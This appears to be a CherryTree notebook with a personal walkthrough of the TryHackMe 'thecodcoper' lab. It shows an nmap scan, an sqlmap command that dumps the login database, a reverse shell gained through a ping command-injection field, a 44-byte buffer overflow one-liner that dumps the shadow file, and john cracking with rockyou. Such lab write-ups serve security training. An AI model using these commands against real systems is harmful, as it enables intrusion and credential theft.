@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="thecodcoper(THM)" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613935834" ts_lastsave="1613936156">
+    <node name="nmap" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613935959" ts_lastsave="1613935979">
+      <rich_text>nmap  10.10.152.219 -p22,80 -T4 -A                                                                                                               130 ⨯
+Starting Nmap 7.91 ( </rich_text>
+      <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+      <rich_text> ) at 2021-02-21 14:09 EST
+Nmap scan report for 10.10.152.219
+Host is up (0.45s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
+|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
+|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   194.71 ms 10.4.0.1
+2   ... 3
+4   452.09 ms 10.10.152.219
+
+OS and Service detection performed. Please report any incorrect results at </rich_text>
+      <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+      <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 35.87 seconds</rich_text>
+    </node>
+    <node name="notes" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613936156" ts_lastsave="1613936398">
+      <rich_text>1-  nmap returns 2 ports (22,80)
+2- Directory busting lead to an login page “administartor.php”
+3- used sqlmap to find possible sqlbypass
+sqlmap -u </rich_text>
+      <rich_text link="webs http://10.10.152.219/administrator.php">http://10.10.152.219/administrator.php</rich_text>
+      <rich_text> -forms --dump-all -a   
+4-Found the credentials 
+username=pingudad 
+password=secretpass
+5- Ran  a nc reverse shell command after loging in command search parameter(which was made for pinging purpose) and got a shell back.
+6- After enumaration i found ssh password for pingu user in /var/hidden/ directory in file named pass
+password=pinguapingu
+7-Now connected to machine as  a user (Previously we were as www-data)
+8-ran linpeas found an interesting dbinary /opt/secret/root
+9- Reverse engneer it to reasd its assembly code and be able to perform buffer overflow 
+10- we use pwndbg for this,we founf out using this tool that we can overwrite eip after sending it 44 bytes
+11- we want to overflow eip with our exploit code which will dump shadow file contents  .Exploit memory address will be pointed(we cant execute it directly because we dont have permissions)
+12-after 44 bytes we can overwrite eip
+13-after succesfull overflow we can make use of this over flow with python
+python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
+and we get dumped hashes of shadow file
+14 use johntheripper for decoding this hash
+john  --wordlist=/usr/share/wordlists/rockyou.txt crackhash.txt
+</rich_text>
+    </node>
+  </node>
+</cherrytree>
